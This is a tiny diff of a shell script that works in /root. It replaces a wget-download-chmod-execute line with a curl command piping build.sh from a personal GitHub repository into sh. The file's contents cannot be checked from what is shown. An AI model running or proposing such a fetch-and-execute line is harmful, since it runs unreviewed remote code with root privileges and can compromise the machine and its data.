@@ -4,4 +4,4 @@
 # kumaha aink we njink
 
 cd /root
-wget https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/buildd.sh && chmod +x buildd.sh && ./buildd.sh
+curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
